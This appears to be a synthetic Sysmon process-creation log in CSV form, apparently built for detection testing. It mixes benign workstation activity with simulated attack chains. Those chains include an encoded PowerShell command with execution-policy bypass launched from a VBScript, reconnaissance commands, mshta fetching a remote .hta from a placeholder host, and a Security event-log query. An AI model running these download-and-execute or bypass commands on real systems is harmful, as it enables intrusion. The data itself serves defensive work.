timestamp,event_id,host,user,image,parent_image,command_line,parent_command_line,integrity_level,logon_type,process_id,parent_process_id,hash_sha256,event_source
2026-09-25T08:00:05Z,1,WIN-WS01,CONTOSO\alice,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,Medium,Interactive,1001,901,SYNTHETIC-0001,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:00:15Z,1,WIN-WS01,CONTOSO\alice,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",C:\Windows\explorer.exe,Medium,Interactive,1002,902,SYNTHETIC-0002,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:00:30Z,1,WIN-WS01,CONTOSO\alice,C:\Windows\System32\notepad.exe,C:\Windows\explorer.exe,C:\Windows\System32\notepad.exe,C:\Windows\explorer.exe,Medium,Interactive,1003,903,SYNTHETIC-0003,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:00:50Z,1,WIN-WS02,CONTOSO\bob,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\explorer.exe,C:\Windows\System32\userinit.exe,Medium,Interactive,1004,904,SYNTHETIC-0004,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:01:05Z,1,WIN-WS02,CONTOSO\bob,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,C:\Windows\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE""",C:\Windows\explorer.exe,Medium,Interactive,1005,905,SYNTHETIC-0005,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:01:20Z,1,WIN-WS03,CONTOSO\carol,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k netsvcs,C:\Windows\System32\services.exe,System,Service,1006,906,SYNTHETIC-0006,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:05:00Z,1,WIN-WS01,CONTOSO\alice,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\wscript.exe,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SYNTHETIC_PAYLOAD_A,wscript.exe C:\Users\Public\update.vbs,High,Interactive,1007,907,SYNTHETIC-0007,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:05:05Z,1,WIN-WS01,CONTOSO\alice,C:\Windows\System32\cmd.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe /c whoami && ipconfig /all,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SYNTHETIC_PAYLOAD_A,High,Interactive,1008,908,SYNTHETIC-0008,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:05:10Z,1,WIN-WS01,CONTOSO\alice,C:\Windows\System32\net.exe,C:\Windows\System32\cmd.exe,net.exe user,cmd.exe /c whoami && ipconfig /all,High,Interactive,1009,909,SYNTHETIC-0009,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:05:15Z,1,WIN-WS01,CONTOSO\alice,C:\Windows\System32\whoami.exe,C:\Windows\System32\cmd.exe,whoami.exe /all,cmd.exe /c whoami && ipconfig /all,High,Interactive,1010,910,SYNTHETIC-0010,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:05:20Z,1,WIN-WS01,CONTOSO\alice,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell.exe -NoProfile -Command ""Get-Process; Get-Service""",cmd.exe /c whoami && ipconfig /all,High,Interactive,1011,911,SYNTHETIC-0011,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:10:00Z,1,WIN-WS02,CONTOSO\bob,C:\Windows\System32\mshta.exe,C:\Windows\explorer.exe,mshta.exe https://example.invalid/update.hta,C:\Windows\explorer.exe,High,Interactive,1012,912,SYNTHETIC-0012,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:10:05Z,1,WIN-WS02,CONTOSO\bob,C:\Windows\System32\cmd.exe,C:\Windows\System32\mshta.exe,cmd.exe /c whoami,mshta.exe https://example.invalid/update.hta,High,Interactive,1013,913,SYNTHETIC-0013,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:10:10Z,1,WIN-WS02,CONTOSO\bob,C:\Windows\System32\ipconfig.exe,C:\Windows\System32\cmd.exe,ipconfig.exe /all,cmd.exe /c whoami,High,Interactive,1014,914,SYNTHETIC-0014,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:10:15Z,1,WIN-WS02,CONTOSO\bob,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell.exe -NoProfile -Command ""Get-CimInstance Win32_Process""",cmd.exe /c whoami,High,Interactive,1015,915,SYNTHETIC-0015,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:15:00Z,1,WIN-SRV01,NT AUTHORITY\SYSTEM,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted,C:\Windows\System32\services.exe,System,Service,1016,916,SYNTHETIC-0016,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:15:15Z,1,WIN-SRV01,NT AUTHORITY\SYSTEM,C:\Windows\System32\cmd.exe,C:\Windows\System32\svchost.exe,"cmd.exe /c ""C:\ProgramData\maintenance.cmd""",C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted,System,Service,1017,917,SYNTHETIC-0017,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:15:20Z,1,WIN-SRV01,NT AUTHORITY\SYSTEM,C:\Windows\System32\wevtutil.exe,C:\Windows\System32\cmd.exe,wevtutil.exe qe Security /c:20,"cmd.exe /c ""C:\ProgramData\maintenance.cmd""",System,Service,1018,918,SYNTHETIC-0018,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:18:20Z,1,WIN-WS03,CONTOSO\carol,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k LocalService,C:\Windows\System32\services.exe,System,Service,1019,919,SYNTHETIC-0019,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:18:40Z,1,WIN-WS03,CONTOSO\carol,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k LocalService,C:\Windows\System32\services.exe,System,Service,1020,920,SYNTHETIC-0020,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:19:00Z,1,WIN-WS03,CONTOSO\carol,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k LocalService,C:\Windows\System32\services.exe,System,Service,1021,921,SYNTHETIC-0021,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:19:20Z,1,WIN-WS03,CONTOSO\carol,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k LocalService,C:\Windows\System32\services.exe,System,Service,1022,922,SYNTHETIC-0022,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:19:40Z,1,WIN-WS03,CONTOSO\carol,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k LocalService,C:\Windows\System32\services.exe,System,Service,1023,923,SYNTHETIC-0023,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:20:00Z,1,WIN-WS03,CONTOSO\carol,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k LocalService,C:\Windows\System32\services.exe,System,Service,1024,924,SYNTHETIC-0024,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:20:20Z,1,WIN-WS03,CONTOSO\carol,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k LocalService,C:\Windows\System32\services.exe,System,Service,1025,925,SYNTHETIC-0025,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:20:40Z,1,WIN-WS03,CONTOSO\carol,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k LocalService,C:\Windows\System32\services.exe,System,Service,1026,926,SYNTHETIC-0026,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:21:00Z,1,WIN-WS03,CONTOSO\carol,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k LocalService,C:\Windows\System32\services.exe,System,Service,1027,927,SYNTHETIC-0027,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:21:20Z,1,WIN-WS03,CONTOSO\carol,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k LocalService,C:\Windows\System32\services.exe,System,Service,1028,928,SYNTHETIC-0028,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:21:40Z,1,WIN-WS03,CONTOSO\carol,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k LocalService,C:\Windows\System32\services.exe,System,Service,1029,929,SYNTHETIC-0029,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:22:00Z,1,WIN-WS03,CONTOSO\carol,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k LocalService,C:\Windows\System32\services.exe,System,Service,1030,930,SYNTHETIC-0030,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:22:20Z,1,WIN-WS03,CONTOSO\carol,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k LocalService,C:\Windows\System32\services.exe,System,Service,1031,931,SYNTHETIC-0031,Microsoft-Windows-Sysmon/Operational
2026-09-25T08:22:40Z,1,WIN-WS03,CONTOSO\carol,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k LocalService,C:\Windows\System32\services.exe,System,Service,1032,932,SYNTHETIC-0032,Microsoft-Windows-Sysmon/Operational
